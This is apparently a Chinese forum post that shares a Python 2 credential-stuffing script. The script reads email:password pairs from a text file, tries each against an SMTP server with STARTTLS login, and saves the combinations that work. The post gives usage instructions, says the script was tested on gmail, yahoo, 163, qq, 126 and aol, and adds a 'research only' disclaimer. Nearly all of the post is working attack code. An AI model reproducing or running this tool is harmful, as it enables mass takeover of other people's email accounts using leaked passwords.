Ps:这个脚本不会在更新了。

<脚本纯属研究只用，如果产生任何后果和作者无关>

测试通过:gmail,yahoo,163,qq,126,aol等

使用方式:python ./mail.py username.txt save.txt

username.txt就是你要扫的文本，文本里面格式必须为如下:

90sec@gmail.com(空格)aiyawocao
90security@gmail.com(空格)aiyoweiwocao

server="smtp服务器地址"

端口请自行更改

#!/usr/bin/env python
#-*- coding:utf-8 -*-
import smtplib
import sys
import time
import threading
class Mythread(threading.Thread):
        def __init__(self,username,pwd):
                threading.Thread.__init__(self)
                self.username = username
                self.pwd = pwd
        def run(self):
                try:
                        server = "smtp.live.com"
                        fp = open(self.username)
                        fp1 = open(self.pwd,'w')
                except Exception, Error1:
                        print "Files fopen Error"
                for line in fp.readlines():
                        lines = line.split(' ')
                        uname = lines[0]
                        password = lines[1]
                        password = password.split('\n')[0]
                        smtp = smtplib.SMTP(server,587)
                        try:
                                smtp.ehlo()
                                smtp.starttls()
                                smtp.ehlo()
                                #smtp.login.SSL(uname,password) 如果启用了SSL,解开这句
                                smtp.login(uname,password)
                        except Exception, LoginError:
                                print "[-]:%s : %s" % (uname,password)
                                time.sleep(1)
                        else:
                                out = "[+]:%s : %s" % (uname,password)
                                print out
                                fp1.write(out)
                                fp1.flush()
if __name__ == '__main__':
        Mythread(sys.argv[1],sys.argv[2]).start()
